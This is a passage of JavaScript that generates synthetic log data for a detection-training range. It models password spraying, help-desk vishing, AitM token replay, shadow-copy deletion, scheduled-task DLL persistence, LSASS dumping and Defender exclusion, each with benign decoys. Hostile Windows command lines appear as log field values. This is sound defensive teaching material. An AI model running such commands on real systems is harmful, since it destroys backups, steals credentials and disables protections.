    // MFA enabled, then used that foothold toward persistent OAuth-based access. The synthetic version
    // here reuses that shape: a low-and-slow spray — a couple of failed guesses against MANY different
    // accounts from one IP, the mirror image of Incident E's credential-stuffing burst against ONE
    // account — succeeds against a forgotten test account, followed by new credentials being added to a
    // service principal. "Add service principal credentials" is the real Microsoft Entra audit-log
    // activity name for that action (learn.microsoft.com/entra/identity/monitoring-health/reference-
    // audit-activities), and MITRE ATT&CK's Account Manipulation: Additional Cloud Credentials
    // (T1098.001) is the technique whose own published procedure examples name APT29/Midnight Blizzard.
    // (MITRE's T1671 "Cloud Application Integration" — the closer conceptual fit for "grant a new
    // malicious OAuth app consent" — does NOT itself cite Midnight Blizzard in its procedure examples as
    // of ATT&CK v19, so this mission is built around the credential-addition step, which does carry that
    // citation, rather than overclaiming the consent-grant angle.)
    const mBase = iso(30); // ~30 hours ago
    const SPRAY_IP = '198.51.100.44';
    ENTRA_USERS.push({ upn: 'qatest01@fabrikam.example', displayName: 'qatest01', dept: 'IT' });
    const spraySet = ['jsmith', 'agomez', 'mrivera', 'cwoo', 'rpatel', 'qatest01'];
    spraySet.forEach((uname, idx) => {
      const upn = uname + '@fabrikam.example';
      for (let a = 0; a < 2; a++) {
        SigninLogs.push({
          TimeGenerated: new Date(mBase.getTime() + (idx * 2 + a) * 15000), Id: hex(mulberry32(750 + idx * 3 + a), 32),
          UserPrincipalName: upn, UserDisplayName: uname, UserId: hex(mulberry32(5051 + idx), 16), UserType: 'member',
          AppDisplayName: 'Office 365 Exchange Online', IPAddress: SPRAY_IP, Location: 'US',
          ResultType: '50126', ResultDescription: 'Error validating credentials due to invalid username or password.',
          ConditionalAccessStatus: 'failure', IsInteractive: true, IsRisky: false, RiskLevelDuringSignIn: 'none',
          ClientAppUsed: 'Browser', AuthenticationRequirement: 'singleFactorAuthentication', CorrelationId: hex(mulberry32(5060 + idx * 3 + a), 32),
        });
      }
    });
    const mSuccessTs = new Date(mBase.getTime() + (spraySet.length * 2) * 15000 + 20000);
    SigninLogs.push({
      TimeGenerated: mSuccessTs, Id: hex(mulberry32(5090), 32),
      UserPrincipalName: 'qatest01@fabrikam.example', UserDisplayName: 'qatest01', UserId: hex(mulberry32(5051 + 5), 16), UserType: 'member',
      AppDisplayName: 'Office 365 Exchange Online', IPAddress: SPRAY_IP, Location: 'US',
      ResultType: '0', ResultDescription: '',
      ConditionalAccessStatus: 'success', IsInteractive: true, IsRisky: true, RiskLevelDuringSignIn: 'high',
      ClientAppUsed: 'Browser', AuthenticationRequirement: 'singleFactorAuthentication', CorrelationId: hex(mulberry32(5091), 32),
    });
    const mCredTs = new Date(mSuccessTs.getTime() + 240000); // 4 min later
    AuditLogs.push({
      TimeGenerated: mCredTs, ActivityDateTime: mCredTs, Id: hex(mulberry32(5092), 32),
      OperationName: 'Add service principal credentials', ActivityDisplayName: 'Add service principal credentials', Category: 'Audit', AADOperationType: 'Add',
      Result: 'success', ResultDescription: '', ResultReason: '',
      Identity: 'qatest01@fabrikam.example', Location: 'US',
      LoggedByService: 'Core Directory', CorrelationId: hex(mulberry32(5093), 32),
    });

    // ---------- Incident J: help-desk social-engineering password reset (lchen / FAB-HR-05) — modeled
    // on the tactic the joint CISA/FBI/HHS advisory AA23-320A ("Scattered Spider," Nov 16 2023) documents
    // for this actor: impersonating an employee on a call to the IT help desk to talk a technician into
    // resetting the account's password, bypassing every technical authentication control because the
    // human, not the login page, is the target. Scattered Spider is the actor widely reported in
    // connection with the September 2023 MGM Resorts and Caesars Entertainment incidents; MGM's own SEC
    // 8-K filing confirms a cybersecurity issue disrupted its systems that month but doesn't itself
    // detail the intrusion vector, so this scenario cites the advisory's documented TTP rather than
    // asserting MGM-specific technical facts this project hasn't verified against a primary source.
    // The tell in this schema: AuditLogs has no flat column for WHO a "Reset user password" event
    // targeted (that lives in the dynamic TargetResources field this range deliberately omits — see the
    // schema note above this table's column list), so the only way to catch this is exactly how a real
    // analyst would when the log doesn't hand you a join for free: notice the reset was performed by an
    // identity other than the routine admin account, then correlate it by time against that user's own
    // next sign-in.
    const vResetTs = iso(6); // ~6 hours ago
    AuditLogs.push({
      TimeGenerated: vResetTs, ActivityDateTime: vResetTs, Id: hex(mulberry32(5100), 32),
      OperationName: 'Reset user password', ActivityDisplayName: 'Reset user password', Category: 'Audit', AADOperationType: 'Update',
      Result: 'success', ResultDescription: '', ResultReason: '',
      Identity: 'helpdesk-admin@fabrikam.example', Location: 'US',
      LoggedByService: 'Core Directory', CorrelationId: hex(mulberry32(5101), 32),
    });
    const vSigninTs = new Date(vResetTs.getTime() + 90000); // 90s later
    SigninLogs.push({
      TimeGenerated: vSigninTs, Id: hex(mulberry32(5102), 32),
      UserPrincipalName: 'lchen@fabrikam.example', UserDisplayName: 'lchen', UserId: hex(mulberry32(5103), 16), UserType: 'member',
      AppDisplayName: 'Office 365 Exchange Online', IPAddress: '203.0.113.140', Location: 'US',
      ResultType: '0', ResultDescription: '',
      ConditionalAccessStatus: 'success', IsInteractive: true, IsRisky: true, RiskLevelDuringSignIn: 'high',
      ClientAppUsed: 'Browser', AuthenticationRequirement: 'singleFactorAuthentication', CorrelationId: hex(mulberry32(5104), 32),
    });

    // ---------- Incident O: helpdesk-vishing executive account takeover with adversary-in-the-middle
    // (AitM) token theft, the stolen session later replayed from anonymizing/residential-proxy
    // infrastructure — modeled on Arctic Wolf's "PREY-0058" activity cluster (TheHackerNews, "Fake IT
    // Calls Target Executives in Microsoft 365 Data Theft and Extortion Attacks," Sept 8, 2026).
    // Per that reporting, callers impersonating internal IT/help-desk staff steer executives to
    // authentication-themed lookalike domains that harvest a live, MFA-satisfied session via AitM, then
    // replay that stolen session token from residential-proxy/anonymizer infrastructure specifically to
    // evade device- and location-based detection. Microsoft Entra ID Protection's own real-time
    // "Anonymous IP address" risk detection — riskEventType `anonymizedIPAddress`, confirmed via
    // learn.microsoft.com/entra/id-protection/concept-identity-protection-risks, whose own wording is
    // "sign-ins from an anonymous IP address (for example, Tor browser or anonymous VPN)... used by
    // actors who want to hide their sign-in information... for potentially malicious intent" — exists
    // specifically to catch this network pattern. This is a genuinely new pivot for this range: s24/s30/
    // s32 each keyed off RiskLevelDuringSignIn or a specific AADSTS result code; this one keys off
    // RiskEventTypes_V2, the column naming WHICH risk detection fired, not just how risky Entra judged
    // the sign-in overall. A decoy sign-in is flagged risky too, but for an unrelated, real detection
    // type (`unfamiliarFeatures`) — teaching that filtering on risk LEVEL alone (e.g. "high") isn't
    // precise: it also catches this range's own older, already-resolved incidents (E/I/J each left a
    // "high" risky sign-in behind), where only the specific anonymizing-proxy detection type isolates
    // today's actual incident. MITRE ATT&CK T1090.002 (External Proxy, Command and Control tactic) is
    // confirmed via attack.mitre.org/techniques/T1090/002/ — its own procedure examples name APT29's
    // documented use of compromised residential endpoints as proxies, the same infrastructure class this
    // campaign relies on (not a claim that APT29 is behind PREY-0058, only that the technique itself is a
    // documented, named ATT&CK sub-technique with real procedural precedent). No new device/user added —
    // cwoo (FAB-EXEC-01, Executive dept) already exists in ENTRA_USERS, avoiding the s9 busiest-device
    // regression class entirely (this incident never touches DeviceProcessEvents/DEVICES at all). ----------
    const oBase = iso(8); // ~8 hours ago
    const PROXY_IP = '203.0.113.212';
    SigninLogs.push({
      TimeGenerated: oBase, Id: hex(mulberry32(5210), 32),
      UserPrincipalName: 'cwoo@fabrikam.example', UserDisplayName: 'cwoo', UserId: hex(mulberry32(5211), 16), UserType: 'member',
      AppDisplayName: 'Office 365 Exchange Online', IPAddress: PROXY_IP, Location: 'US',
      ResultType: '0', ResultDescription: '',
      ConditionalAccessStatus: 'success', IsInteractive: true, IsRisky: true, RiskLevelDuringSignIn: 'high',
      RiskEventTypes_V2: 'anonymizedIPAddress',
      ClientAppUsed: 'Browser', AuthenticationRequirement: 'multiFactorAuthentication', CorrelationId: hex(mulberry32(5212), 32),
    });
    const oDecoyTs = new Date(oBase.getTime() + 3 * 3600000); // 3h later, unrelated account/reason
    SigninLogs.push({
      TimeGenerated: oDecoyTs, Id: hex(mulberry32(5213), 32),
      UserPrincipalName: 'mrivera@fabrikam.example', UserDisplayName: 'mrivera', UserId: hex(mulberry32(5214), 16), UserType: 'member',
      AppDisplayName: 'Microsoft Teams', IPAddress: '20.113.44.9', Location: 'US',
      ResultType: '0', ResultDescription: '',
      ConditionalAccessStatus: 'success', IsInteractive: true, IsRisky: true, RiskLevelDuringSignIn: 'high',
      RiskEventTypes_V2: 'unfamiliarFeatures',
      ClientAppUsed: 'Browser', AuthenticationRequirement: 'multiFactorAuthentication', CorrelationId: hex(mulberry32(5215), 32),
    });

    // ---------- Incident P: ransomware pre-encryption shadow-copy deletion (FAB-ENG-01 / tnowak) — the
    // classic "inhibit system recovery" step ransomware operators run right before encrypting a victim,
    // so backups/restore points can't undo the damage. Grounded in MITRE ATT&CK T1490 (Inhibit System
    // Recovery, Impact tactic — fetched and read directly from attack.mitre.org/techniques/T1490/ before
    // use), whose own page documents the near-identical real command used by BlackCat/ALPHV
    // ("vssadmin.exe delete shadows /all /quiet" plus "wmic.exe Shadowcopy Delete"), by Conti ("can
    // delete Windows Volume Shadow Copies using vssadmin"), and by WannaCry ("uses vssadmin, wbadmin,
    // bcdedit, and wmic to delete and disable operating system recovery features") — and independently
    // corroborated by CISA/FBI's own #StopRansomware Medusa Ransomware advisory (AA25-071A,
    // cisa.gov/news-events/cybersecurity-advisories/aa25-071a), which quotes the EXACT command observed
    // in a real Medusa incident: "vssadmin.exe Delete Shadows /all /quiet" — used verbatim below. This is
    // one of the single best-attested ransomware TTPs across multiple independent primary sources, not a
    // one-off report. Timed to today's active ransomware-landscape news (INC Ransom's 11-victim
    // manufacturing/healthcare surge and the newly-emerged "Panzer" RaaS group, both covered in today's
    // briefing) as motivating context — this mission does NOT claim either specific group ran this exact
    // command; it's built directly from the CISA/MITRE-verified technique itself, which is what any
    // ransomware operator would plausibly run on the way to encryption. No new device added —
    // FAB-ENG-01/tnowak already exists in DEVICES, avoiding the s9 busiest-device regression class. ----------
    const rsBase = iso(1.5); // ~90 minutes ago
    DeviceProcessEvents.push({
      Timestamp: rsBase, DeviceName: 'FAB-ENG-01', ActionType: 'ProcessCreated',
      FileName: 'vssadmin.exe', FolderPath: 'C:\\Windows\\System32',
      SHA1: hex(mulberry32(6100), 40), ProcessId: 7788,
      ProcessCommandLine: 'vssadmin.exe Delete Shadows /all /quiet',
      AccountDomain: 'FABRIKAM', AccountName: 'tnowak',
      InitiatingProcessFileName: 'cmd.exe', InitiatingProcessFolderPath: 'C:\\Windows\\System32',
      InitiatingProcessCommandLine: 'cmd.exe /c vssadmin.exe Delete Shadows /all /quiet',
      InitiatingProcessAccountDomain: 'FABRIKAM', InitiatingProcessAccountName: 'tnowak',
    });
    // Decoy: the SAME vssadmin.exe, but running a routine, READ-ONLY backup-monitoring check
    // ("list shadows") under the legitimate backup service account, on an unrelated device/time — a bare
    // `FileName == "vssadmin.exe"` sweep catches this benign row too; only the destructive
    // "Delete Shadows" command line is the real signal, not the binary's name.
    DeviceProcessEvents.push({
      Timestamp: iso(30), DeviceName: 'FAB-IT-01', ActionType: 'ProcessCreated',
      FileName: 'vssadmin.exe', FolderPath: 'C:\\Windows\\System32',
      SHA1: hex(mulberry32(6101), 40), ProcessId: 3311,
      ProcessCommandLine: 'vssadmin.exe list shadows',
      AccountDomain: 'FABRIKAM', AccountName: 'svc_backup',
      InitiatingProcessFileName: 'cmd.exe', InitiatingProcessFolderPath: 'C:\\Windows\\System32',
      InitiatingProcessCommandLine: 'cmd.exe /c vssadmin.exe list shadows',
      InitiatingProcessAccountDomain: 'FABRIKAM', InitiatingProcessAccountName: 'svc_backup',
    });

    // ---------- Incident Q: UTA0560 scheduled-task persistence after a chained Chrome+Windows-kernel
    // 0-day exploit chain — grounded in Volexity's "Mind the (Patch) Gap: Multiple Chinese Threat Actors
    // Chain 0-day Exploits in Chrome & Windows" (volexity.com/blog/2026/09/09/mind-the-patch-gap-multiple-
    // chinese-threat-actors-chain-0-day-exploits-in-chrome-windows/, published Sept 9 2026, fetched and
    // read directly). Per that report, two Chinese threat actors — UTA0560 and JungleBamboo (aka APT31/
    // Violet Typhoon/TA412) — were independently observed chaining THREE zero-days for full browser-to-
    // kernel compromise: CVE-2026-85046 (a Chrome V8 type-confusion bug), CVE-2026-87491 (a WebAssembly
    // sandbox-escape defect), and CVE-2026-85880 (a Windows kernel privilege-escalation bug in
    // RtlpCreateServerAcl). Notably, the fix for the Chromium-side bug had existed in Chromium's own
    // source tree since August 4, 2026 but hadn't yet reached a released Chrome build — an unusual
    // "patch gap" zero-day window, hence the post's title.
    //   UTA0560's post-exploitation persistence chain, in the report's own words: a dropper (msgbox.exe,
    //   compiled August 31, 2026) extracts a legitimate Windows EXE and a malicious sideloaded DLL
    //   (wsc.dll) from PE resources; wsc.dll then establishes persistence by creating a scheduled task
    //   NAMED "Windows Scheduled System" that "re-runs the sideloading chain every five minutes." Both
    //   the exact task name and the five-minute cadence are Volexity's own reported wording — the one
    //   concrete, quotable IOC this mission is built around.
    //   NOT independently confirmed by the source (illustrative, not invented-as-fact): Volexity
    //   describes the task's BEHAVIOR (name + 5-minute recurrence) in prose, not a literal schtasks.exe
    //   command line — so the exact /sc minute /mo 5 flag syntax below is standard, Microsoft-documented
    //   schtasks.exe syntax for that exact behavior (learn.microsoft.com/windows-server/administration/
    //   windows-commands/schtasks-create, fetched and confirmed directly this round), not a string quoted
    //   from Volexity's post. Likewise, the DLL's folder path and rundll32 export name aren't published
    //   by Volexity and are illustrative filler, the same policy this range used for the ShieldBreak
    //   (s34) and REVSTEALER (s35) missions when a vendor reported a mechanism without a literal captured
    //   command line.
    //   This mission does NOT claim UTA0560 targeted this exact fictional company — it models the
    //   general-purpose persistence step Volexity documented, which any actor running this playbook
    //   would leave behind, on an ordinary compromised user account (not SYSTEM) since this is
    //   user-context malware persistence following a browser-launched exploit chain, not a SYSTEM-level
    //   payload. No new device added to DEVICES — FAB-EXEC-01 (cwoo) and FAB-IT-01 (svc_backup) already
    //   exist, avoiding the s9 busiest-device regression class every incident since K has worked around.
    //   The malicious folder path is kept out of FolderPath entirely (it only appears inside
    //   ProcessCommandLine's /tr argument) to avoid the Temp/Roaming collision class that hit two earlier
    //   rounds (s28, s35) against s14's FolderPath mission. MITRE ATT&CK T1053.005 (Scheduled Task/Job:
    //   Scheduled Task) — fetched and read directly from attack.mitre.org/techniques/T1053/005/ before
    //   use; genuinely new to this range, and genuinely maps to THREE tactics at once (Execution,
    //   Persistence, Privilege Escalation), similar to how T1078 already spans four. ----------
    const qBase = iso(0.75); // ~45 minutes ago
    DeviceProcessEvents.push({
      Timestamp: qBase, DeviceName: 'FAB-EXEC-01', ActionType: 'ProcessCreated',
      FileName: 'schtasks.exe', FolderPath: 'C:\\Windows\\System32',
      SHA1: hex(mulberry32(6200), 40), ProcessId: 9911,
      ProcessCommandLine: 'schtasks.exe /create /sc minute /mo 5 /tn "Windows Scheduled System" /tr "rundll32.exe C:\\ProgramData\\WSCUpdate\\wsc.dll,Entry" /f',
      AccountDomain: 'FABRIKAM', AccountName: 'cwoo',
      InitiatingProcessFileName: 'rundll32.exe', InitiatingProcessFolderPath: 'C:\\Windows\\System32',
      InitiatingProcessCommandLine: 'rundll32.exe C:\\ProgramData\\WSCUpdate\\wsc.dll,Entry',
      InitiatingProcessAccountDomain: 'FABRIKAM', InitiatingProcessAccountName: 'cwoo',
    });
    // Decoy: the SAME schtasks.exe, used the ordinary way — an IT admin creating a routine, differently-
    // named nightly backup-verification task from PowerShell, on the existing FAB-IT-01 device at an
    // unrelated time. A bare `FileName == "schtasks.exe"` sweep catches this benign row too; only the
    // specific malicious task name isolates the real incident.
    DeviceProcessEvents.push({
      Timestamp: iso(19.5), DeviceName: 'FAB-IT-01', ActionType: 'ProcessCreated',
      FileName: 'schtasks.exe', FolderPath: 'C:\\Windows\\System32',
      SHA1: hex(mulberry32(6201), 40), ProcessId: 4420,
      ProcessCommandLine: 'schtasks.exe /create /sc daily /st 02:00 /tn "Fabrikam Nightly Backup Verify" /tr "C:\\Scripts\\verify_backup.ps1" /f',
      AccountDomain: 'FABRIKAM', AccountName: 'svc_backup',
      InitiatingProcessFileName: 'powershell.exe', InitiatingProcessFolderPath: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0',
      InitiatingProcessCommandLine: 'powershell.exe -File C:\\Scripts\\create_backup_task.ps1',
      InitiatingProcessAccountDomain: 'FABRIKAM', InitiatingProcessAccountName: 'svc_backup',
    });

    // ---------- Incident R: UNC3569's Sogou Input Method exploit chain delivering the GRAYRABBIT
    // backdoor via 7-Zip DLL search-order hijacking — reported by Gen Digital while investigating a live
    // UNC3569 intrusion (fetched and read directly via TheHackerNews' Sept 2026 coverage of Gen Digital's
    // findings), tracked as CVE-2026-51990 in Sogou Input Method's `biz_helper.exe` sgbiz: link handler
    // (Tencent patched it April 21, 2026 in v16.3.0.3498, restricting the handler to HTTPS-only and four
    // approved hostnames — the browser engine itself was left unpatched).
    //   The reported chain: a crafted sgbiz: link (delivered via email/chat) launches SGMyInput.exe with
    //   attacker-controlled parameters that the link handler never validated; this drives Sogou's own
    //   bundled, sandbox-disabled Chromium build (v80, from March 2020) to load an attacker page from
    //   noht1ng[.]top, which triggers the unpatched V8 flaw CVE-2021-38003 to run a downloader. That
    //   downloader stages a LEGITIMATE 7-Zip executable plus a malicious `7z.dll` together in
    //   `C:\Users\Public\Documents\` — 7-Zip loads any DLL sitting in its own folder at startup, so
    //   placing a malicious `7z.dll` next to the real `7z.exe` there is enough to get it executed; this
    //   exact archiving-tool DLL-hijack pattern has real precedent independently documented on MITRE's
    //   own T1574.001 page (Storm-1811 sideloaded a malicious `7z.DLL` via a modified `7zG.exe` to load a
    //   Cobalt Strike beacon). The malicious `7z.dll` here checks the process count to detect sandboxes
    //   (50+ processes required) and hides its own file via an NTFS alternate data stream before loading
    //   the GRAYRABBIT backdoor (`core.dll`), which talks RC4-scrambled plain TCP (not TLS) to
    //   `mail.uaiubifas[.]top` on port 443.
    //   MITRE ATT&CK T1574.001 (Hijack Execution Flow: DLL, formerly "DLL Search Order Hijacking") —
    //   fetched and read directly from attack.mitre.org/techniques/T1574/001/ before use; maps to the v19
    //   "Stealth" tactic plus Execution, and is genuinely new to this range (never used in s1-s39).
    //   NOT independently confirmed by the source (illustrative, not invented-as-fact): Gen Digital's
    //   write-up does not name the specific process that executes the dropped 7z.exe after the downloader
    //   stages it — the only process explicitly named at that point in the chain is SGMyInput.exe (the
    //   target of the crafted sgbiz: link itself), so this mission attributes the resulting execution to
    //   it as a disclosed simplification of the intermediate downloader step, the same policy this range
    //   used for ShieldBreak (s34), REVSTEALER (s35), and the s39 scheduled-task syntax when a source
    //   described a mechanism without a fully specified command chain. The real 7-Zip install location
    //   (C:\Program Files\7-Zip) is independently already used as a benign row in this dataset (Incident
    //   F's cryptomining-decoy row, above) — reused here as the "what normal looks like" contrast rather
    //   than duplicating a second benign row. No new device added to DEVICES — FAB-MKT-02 (mrivera)
    //   already exists, avoiding the s9 busiest-device regression class every incident since K has worked
    //   around. The malicious folder is C:\Users\Public\Documents, which contains neither "Temp" nor
    //   "Roaming", so it does not collide with s14's FolderPath mission. ----------
    const grBase = iso(2.25); // ~2h15m ago
    DeviceProcessEvents.push({
      Timestamp: grBase, DeviceName: 'FAB-MKT-02', ActionType: 'ProcessCreated',
      FileName: '7z.exe', FolderPath: 'C:\\Users\\Public\\Documents',
      SHA1: hex(mulberry32(6300), 40), ProcessId: 5566,
      ProcessCommandLine: '7z.exe',
      AccountDomain: 'FABRIKAM', AccountName: 'mrivera',
      InitiatingProcessFileName: 'SGMyInput.exe',
      InitiatingProcessAccountDomain: 'FABRIKAM', InitiatingProcessAccountName: 'mrivera',
    });

    // ---------- Incident S: Task Manager used to dump LSASS memory on an under-monitored HR endpoint —
    // grounded in Prophet Security's quarterly threat report (published via BleepingComputer, "The Top 4
    // Threats We Found by Investigating Every Alert for a Quarter," Sept 10 2026, fetched and read
    // directly), which analyzed 4.7 million alert-investigation questions across customer environments
    // (May-July 2026) and found a 7% malicious-confirmation rate. Its fourth top-threat category,
    // "Unmonitored Assets" (~9% of confirmed malicious activity), states in its own words that the
    // longest-running intrusions occurred on devices with no endpoint agent installed at all, where
    // "Attackers used accessibility utilities, task manager, and error reporting services to access the
    // Local Security Authority Subsystem Service (LSASS)" (separately, other attackers in the same
    // category bypassed LSASS entirely via shadow copies/registry reads — not modeled here, since this
    // mission is specifically about the Task Manager sub-case).
    //   NOT independently confirmed by that source (illustrative, not invented-as-fact): BleepingComputer/
    //   Prophet Security's own report does not give an exact file path or command line for the Task
    //   Manager sub-case specifically — it names the tool and the target (LSASS), not the mechanics. The
    //   exact, well-documented mechanism used below comes from two independent sources, fetched and read
    //   directly rather than assumed, and is disclosed here rather than silently conflated with Prophet's
    //   report:
    //     1. MITRE CAR-2019-08-001 (car.mitre.org/analytics/CAR-2019-08-001/), the official MITRE Cyber
    //        Analytics Repository analytic for exactly this technique, describing the mechanism as
    //        "launching Task Manager as a privileged user, selecting lsass.exe, and clicking 'Create dump
    //        file'" — its own documented true-positive example (from the Mordor dataset) shows the file
    //        created at c:\users\[username]\appdata\local\temp\lsass.dmp by taskmgr.exe.
    //     2. The SigmaHQ community Sigma rule for this exact technique, file_event_win_taskmgr_lsass_dump
    //        (detection.fyi/sigmahq/sigma/windows/file/file_event/file_event_win_taskmgr_lsass_dump/),
    //        which fires when taskmgr.exe (from C:\Windows\system32\ or C:\Windows\SysWOW64\) creates a
    //        file whose path contains \AppData\Local\Temp\, whose name contains "lsass", with a ".DMP"
    //        extension — rule severity High. (The Sigma rule's own condition checks a literal ".DMP"
    //        extension while CAR's quoted Mordor-dataset example path uses lowercase ".dmp" — both are
    //        cited rather than silently picking one; this mission's data uses "lsass.DMP" to match the
    //        Sigma rule's literal condition and real Task Manager's actual dump-naming convention.)
    //   MITRE ATT&CK T1003.001 (OS Credential Dumping: LSASS Memory, Credential Access tactic — fetched
    //   and read directly from attack.mitre.org/techniques/T1003/001/ before use) independently
    //   cross-confirms Task Manager as a real-world LSASS-dumping method in its own procedure examples:
    //   the "Cutting Edge" campaign ("threat actors used Task Manager to dump LSASS memory from Windows
    //   devices to disk"), the Iranian group Magic Hound ("has stolen domain credentials by dumping LSASS
    //   process memory using Task Manager, comsvcs.dll..."), and the Play ransomware group ("has used
    //   Mimikatz and the Windows Task Manager to dump LSASS process memory") — three independent named
    //   threat actors, not a one-off technique write-up. Genuinely new to this range (never used in
    //   s1-s40).
    //   No new device added to DEVICES — FAB-HR-02 (agomez) already exists, avoiding the s9 busiest-device
    //   regression class every incident since K has worked around; it's also a fitting narrative choice,
    //   since Prophet's "Unmonitored Assets" category is specifically about ordinary endpoints (not
    //   servers) that lack close monitoring, and FAB-HR-02 is one of this range's least-used devices.
    //   This mission's row is a DeviceFileEvents row (a file-creation event), not DeviceProcessEvents —
    //   Task Manager writes the dump file directly rather than spawning a child process to do it, which
    //   both matches the real mechanism and means this data cannot collide with s14's or the s-FAB-ENG-03
    //   mission's `FolderPath contains "Temp"/"Roaming"` checks, both of which are scoped to the
    //   DeviceProcessEvents table specifically (verified: DeviceFileEvents-table missions are unaffected
    //   by anything added to DeviceProcessEvents and vice versa). The one existing DeviceFileEvents
    //   mission that filters on FolderPath (the "Roaming" dropped-DLL mission) filters for "Roaming", not
    //   "Temp", and this incident's folder path is `...\AppData\Local\Temp`, which contains neither
    //   "Roaming" nor any substring that mission checks for — confirmed with the Node harness below, not
    //   just asserted. ----------
    const tmBase = iso(3.75); // ~3h45m ago
    DeviceFileEvents.push({
      // Illustrative FileSize (~40MB): a plausible size for a full LSASS memory dump, not a captured
      // real-world artifact's byte count — neither source publishes one, so this is disclosed as filler,
      // same policy as every other non-load-bearing illustrative detail in this range (e.g. s34's calc.exe).
      Timestamp: tmBase, DeviceName: 'FAB-HR-02', ActionType: 'FileCreated',
      FileName: 'lsass.DMP', FolderPath: 'C:\\Users\\agomez\\AppData\\Local\\Temp',
      SHA1: hex(mulberry32(6400), 40), FileSize: 41943040,
      InitiatingProcessFileName: 'taskmgr.exe', InitiatingProcessFolderPath: 'C:\\Windows\\System32',
      InitiatingProcessAccountDomain: 'FABRIKAM', InitiatingProcessAccountName: 'agomez',
    });
    // Decoy: the SAME taskmgr.exe binary, from the same real System32 path, used the ordinary way — an
    // IT admin using Task Manager's "Create dump file" feature the way it's actually meant to be used, to
    // capture a crashed Outlook process for troubleshooting, on the existing FAB-IT-01 device/svc_backup
    // account at an unrelated time. A naive `InitiatingProcessFileName == "taskmgr.exe"` sweep catches
    // this benign row too (2 total); only the dumped file's own name — "lsass" — isolates the real
    // incident to exactly 1, the same "the tool's name is never the signal" lesson as s33/s35/s39/s40,
    // applied here to a file-creation event instead of a process-spawn event.
    DeviceFileEvents.push({
      Timestamp: iso(46), DeviceName: 'FAB-IT-01', ActionType: 'FileCreated',
      FileName: 'OUTLOOK.DMP', FolderPath: 'C:\\Users\\svc_backup\\AppData\\Local\\Temp',
      SHA1: hex(mulberry32(6401), 40), FileSize: 118784,
      InitiatingProcessFileName: 'taskmgr.exe', InitiatingProcessFolderPath: 'C:\\Windows\\System32',
      InitiatingProcessAccountDomain: 'FABRIKAM', InitiatingProcessAccountName: 'svc_backup',
    });

    // ---------- Incident T: a fake "AI Windows plugin" installer tells PowerShell to add itself to
    // Windows Defender's scan-exclusion list before running — grounded in Microsoft's own "Detect and
    // disrupt AI-themed attacks with Microsoft Defender" post (microsoft.com/en-us/security/blog/2026/
    // 09/10/detect-and-disrupt-ai-themed-attacks-with-microsoft-defender/, published Sept 10 2026, fetched
    // and read directly), which lists — among several AI-branded social-engineering cases Microsoft's own
    // telemetry caught this year — "malvertising for a fake AI Windows plugin that delivered the Vidar
    // stealer." Microsoft's own post names the malware family (Vidar) and the lure category (a fake AI
    // Windows plugin) but does not itself publish the installer's file name or its defense-evasion
    // mechanics.
    //   The specific mechanism modeled here comes from a separate, independently-published report on the
    //   same pattern — Darktrace's analysis of a fake Google Gemini installer campaign, via Cyber Security
    //   News ("Hackers Use Fake Google Gemini Installer to Deploy Vidar Stealer and Steal Browser
    //   Credentials," Aug 21 2026, fetched and read directly): a Google Colab page redirects to a fake
    //   "Windows Software Hub" site serving Download_Google_Gemini_For_Windows.exe / GoogleAppInstaller.exe,
    //   whose own bundled README instructs the victim to run it as administrator and "add it to antivirus
    //   exception lists" before a Go-compiled Vidar payload runs and starts harvesting browser-stored
    //   credentials and session data. This is disclosed explicitly as a DIFFERENT, though matching-shaped,
    //   campaign from the one Microsoft's Sept 10 post references in passing — not claimed to be the same
    //   incident — the same policy this range has used whenever a current-week source names a pattern
    //   without giving its full mechanics (s34/ShieldBreak, s35/REVSTEALER, s39's scheduled-task syntax).
    //   The exact PowerShell syntax below (Add-MpPreference -ExclusionPath '<folder>') is Microsoft's own,
    //   real, documented cmdlet syntax (learn.microsoft.com/powershell/module/defender/add-mppreference,
    //   fetched and confirmed directly this round — its own example is literally `Add-MpPreference
    //   -ExclusionPath 'C:\Temp'`), not a string quoted from either source above — an installer's README
    //   telling a victim to "add it to antivirus exceptions" doesn't by itself specify a command line; this
    //   fills that gap with the real cmdlet that instruction maps to, exactly as MITRE's own T1562.001 page
    //   documents this technique commonly being carried out via PowerShell.
    //   MITRE ATT&CK T1562.001 (Impair Defenses: Disable or Modify Tools) — fetched and confirmed directly
    //   against attack.mitre.org/techniques/T1562/001/ before use, cross-checked against an independent
    //   mirror of the same page, whose procedure-examples table independently names Indrik Spider, Egregor,
    //   and Maze all disabling Windows Defender's real-time protection by this general class of technique
    //   (none of those three is claimed to be behind THIS specific installer — only that the technique
    //   itself is a real, well-precedented one, not invented for this mission). T1562 is genuinely new to
    //   this range's technique coverage (never used in s1-s41) and — per MITRE's April 2026 v19 update that
    //   split the old "Defense Evasion" tactic — maps to the "Defense Impairment" tactic (TA0112,
    //   attack.mitre.org/tactics/TA0112/), which no earlier mission in this range has touched at all: this
    //   is the first green square this range's coverage heatmap will show for that tactic.
    //   No new device added to DEVICES — FAB-MKT-06 (ohansen) already exists (used so far only for
    //   Incident E's Entra/Sentinel-table story), avoiding the s9 busiest-device regression class every
    //   incident since K has worked around; this is also this range's first DeviceProcessEvents row on that
    //   device. The malicious ExclusionPath sits under AppData\Local, never under "Temp" or "Roaming"
    //   specifically, and it lives inside ProcessCommandLine rather than FolderPath, so it cannot collide
    //   with s14's FolderPath-scoped Temp/Roaming mission — the same class of check every round since s28
    //   has made explicit and the Node harness below confirms concretely. ----------
    const gtBase = iso(6.5); // ~6.5 hours ago
    DeviceProcessEvents.push({
      Timestamp: gtBase, DeviceName: 'FAB-MKT-06', ActionType: 'ProcessCreated',
      FileName: 'powershell.exe', FolderPath: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0',
      SHA1: hex(mulberry32(6500), 40), ProcessId: 8821,
      ProcessCommandLine: 'powershell.exe -Command "Add-MpPreference -ExclusionPath \'C:\\Users\\ohansen\\AppData\\Local\\GoogleAppInstaller\'"',
      AccountDomain: 'FABRIKAM', AccountName: 'ohansen',
      InitiatingProcessFileName: 'GoogleAppInstaller.exe', InitiatingProcessFolderPath: 'C:\\Users\\ohansen\\AppData\\Local\\GoogleAppInstaller',
      InitiatingProcessCommandLine: 'GoogleAppInstaller.exe', InitiatingProcessAccountDomain: 'FABRIKAM', InitiatingProcessAccountName: 'ohansen',
    });
    // Decoy: the SAME cmdlet, run the ordinary way — an IT admin's PowerShell script adding a Defender
    // exclusion for a real, Program-Files-installed backup tool during a routine software rollout, on the
    // existing FAB-IT-01 device at an unrelated time. A naive `ProcessCommandLine contains
